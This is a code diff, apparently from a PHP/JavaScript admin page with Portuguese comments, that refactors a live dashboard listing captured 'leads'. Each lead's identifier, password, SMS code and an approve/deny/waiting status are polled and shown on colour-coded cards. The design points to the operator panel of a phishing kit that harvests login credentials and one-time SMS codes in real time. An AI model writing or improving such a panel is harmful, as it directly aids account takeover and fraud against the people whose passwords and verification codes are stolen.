@@ -194,30 +194,44 @@ session_start();
                 const leads = await response.json();
 
                 if (leadsContainer.children.length === 0 && leads.length === 0) {
-                     leadsContainer.innerHTML = '<p class="card" style="grid-column: 1 / -1;">Nenhum lead recebido ainda.</p>';
+                    leadsContainer.innerHTML = '<p class="card" style="grid-column: 1 / -1;">Nenhum lead recebido ainda.</p>';
                 }
 
                 leads.forEach(lead => {
-                    if (!document.getElementById(`lead-${lead.id}`)) {
+                    let card;
+                    const existingCard = document.getElementById(`lead-${lead.id}`);
+
+                    if (!existingCard) {
                         const cardClone = leadTemplate.content.cloneNode(true);
-                        const newCard = cardClone.querySelector('.lead-card');
-                        newCard.id = `lead-${lead.id}`;
-                        newCard.dataset.id = lead.id;
-                        
-                        newCard.querySelector('.lead-id').textContent = lead.id;
-                        newCard.querySelector('.lead-date').textContent = new Date(lead.data_criacao).toLocaleString('pt-BR');
-                        newCard.querySelector('.lead-identifier').textContent = lead.identificador;
-                        newCard.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
-                        newCard.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
-                        newCard.querySelector('.lead-status').textContent = lead.status;
-                        
-                        leadsContainer.prepend(newCard);
+                        card = cardClone.querySelector('.lead-card');
+                        card.id = `lead-${lead.id}`;
+                        card.dataset.id = lead.id;
+                        leadsContainer.prepend(card);
                     } else {
-                        // Atualiza o status se o card já existir
-                        const existingCard = document.getElementById(`lead-${lead.id}`);
-                        existingCard.querySelector('.lead-status').textContent = lead.status;
-                        existingCard.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
-                        existingCard.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
+                        card = existingCard;
+                    }
+
+                    // Atualiza todos os campos
+                    card.querySelector('.lead-id').textContent = lead.id;
+                    card.querySelector('.lead-date').textContent = new Date(lead.data_criacao).toLocaleString('pt-BR');
+                    card.querySelector('.lead-identifier').textContent = lead.identificador;
+                    card.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
+                    card.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
+                    
+                    // LÓGICA DE CORES PARA O STATUS
+                    const statusSpan = card.querySelector('.lead-status');
+                    const statusText = lead.status || 'indefinido';
+                    statusSpan.textContent = statusText;
+
+                    // Remove classes de cor antigas
+                    statusSpan.style.color = ''; 
+                    
+                    if (statusText.toLowerCase().includes('aprovado')) {
+                        statusSpan.style.color = 'var(--accent-success)';
+                    } else if (statusText.toLowerCase().includes('negado')) {
+                        statusSpan.style.color = 'var(--accent-danger)';
+                    } else if (statusText.toLowerCase().includes('aguardando')) {
+                        statusSpan.style.color = 'var(--accent-primary)';
                     }
                 });
                 
